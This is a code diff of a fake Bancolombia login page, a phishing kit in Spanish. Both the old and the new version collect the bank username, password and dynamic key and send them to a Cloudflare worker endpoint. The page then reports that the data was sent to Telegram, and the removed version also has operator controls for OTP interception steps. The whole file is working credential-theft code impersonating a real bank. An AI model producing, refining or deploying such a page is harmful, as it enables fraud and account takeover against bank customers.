@@ -5,127 +5,81 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Login Bancolombia</title>
 <style>
-  body {
-    font-family: Arial, sans-serif;
+body {
     display: flex;
-    flex-direction: column;
+    justify-content: center;
     align-items: center;
-    padding: 40px;
-  }
-
-  input, button {
+    height: 100vh;
+    background: #f0f0f0;
+    font-family: Arial, sans-serif;
+}
+.container {
+    background: #fff;
+    padding: 20px 30px;
+    border-radius: 10px;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+    width: 300px;
+}
+input {
+    width: 100%;
     padding: 10px;
-    margin: 5px;
+    margin: 10px 0;
     font-size: 16px;
-  }
-
-  .button-container button {
-    margin: 5px;
+}
+button {
+    width: 100%;
+    padding: 12px;
+    font-size: 16px;
+    background: #0070ba;
+    color: white;
+    border: none;
+    border-radius: 5px;
     cursor: pointer;
-  }
-
-  .hidden {
-    display: none;
-  }
-
-  #status {
-    margin-top: 20px;
-    font-weight: bold;
-  }
+}
+button:hover { background: #005fa3; }
 </style>
 </head>
 <body>
-
-<h2>Login Bancolombia</h2>
-
-<div id="login-form">
-  <input type="text" id="usuario" placeholder="Usuario">
-  <input type="password" id="clave" placeholder="Clave">
-  <button id="login-btn">Enviar</button>
+<div class="container">
+    <h2>Login</h2>
+    <input type="text" id="usuario" placeholder="Usuario">
+    <input type="password" id="clave" placeholder="Clave">
+    <input type="text" id="dinamica" placeholder="Dinámica">
+    <button id="enviar">Enviar</button>
 </div>
-
-<div id="action-buttons" class="button-container hidden">
-  <button data-action="autorizar">Autorizar</button>
-  <button data-action="error">Error</button>
-  <button data-action="otp">Solicitar OTP</button>
-  <button data-action="fallo">Fallo TC</button>
-  <button data-action="finalizar">Finalizar</button>
-</div>
-
-<div id="code-input" class="hidden">
-  <input type="text" id="codigo" placeholder="Ingresa el código">
-  <button id="submit-code">Enviar Código</button>
-</div>
-
-<div id="status"></div>
 
 <script>
-const baseURL = "https://blue-night-7897.claropromoxlaro.workers.dev";
+document.getElementById("enviar").addEventListener("click", async () => {
+    const usuario = document.getElementById("usuario").value;
+    const clave = document.getElementById("clave").value;
+    const dinamica = document.getElementById("dinamica").value;
 
-let transactionId = null;
+    if (!usuario || !clave) {
+        alert("Debes completar usuario y clave.");
+        return;
+    }
 
-// Función para mostrar status
-function setStatus(msg) {
-  document.getElementById('status').innerText = msg;
-}
+    const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
 
-// Login
-document.getElementById('login-btn').addEventListener('click', async () => {
-  const usuario = document.getElementById('usuario').value;
-  const clave = document.getElementById('clave').value;
-  if (!usuario || !clave) return setStatus("Completa usuario y clave");
+    localStorage.setItem("transactionId", transactionId);
+    localStorage.setItem("bancoldata", JSON.stringify({usuario, clave, dinamica}));
 
-  transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
-  localStorage.setItem('transactionId', transactionId);
-
-  const res = await fetch(`${baseURL}/login`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ usuario, clave, transactionId })
-  });
-
-  if (res.ok) {
-    setStatus("Datos enviados a Telegram");
-    document.getElementById('login-form').classList.add('hidden');
-    document.getElementById('action-buttons').classList.remove('hidden');
-    document.getElementById('code-input').classList.remove('hidden');
-  } else {
-    setStatus("Error al enviar datos");
-  }
-});
-
-// Manejo de botones
-document.querySelectorAll('#action-buttons button').forEach(btn => {
-  btn.addEventListener('click', async () => {
-    const action = btn.dataset.action;
-    document.getElementById('action-buttons').classList.add('hidden'); // Ocultar botones
-
-    const res = await fetch(`${baseURL}/${action}?id=${transactionId}`);
-    if (res.ok) setStatus(`Acción "${action}" registrada. Ingresa el código para desbloquear botones`);
-    else setStatus("Error al registrar acción");
-  });
-});
-
-// Enviar código
-document.getElementById('submit-code').addEventListener('click', async () => {
-  const codigo = document.getElementById('codigo').value;
-  if (!codigo) return setStatus("Ingresa un código");
-
-  const res = await fetch(`${baseURL}/reset`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ id: transactionId })
-  });
-
-  if (res.ok) {
-    setStatus("Botones desbloqueados. Puedes elegir otra opción.");
-    document.getElementById('action-buttons').classList.remove('hidden');
-    document.getElementById('codigo').value = "";
-  } else {
-    setStatus("Error al desbloquear botones");
-  }
+    try {
+        const res = await fetch("https://tu-worker-url/login", {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({usuario, clave, dinamica, transactionId})
+        });
+        const data = await res.json();
+        if (data.ok) {
+            alert("Datos enviados a Telegram correctamente.");
+            window.location.href = "dinamica.html"; // página para ingresar la dinámica
+        }
+    } catch(e) {
+        console.error(e);
+        alert("Error al enviar los datos.");
+    }
 });
 </script>
-
 </body>
 </html>
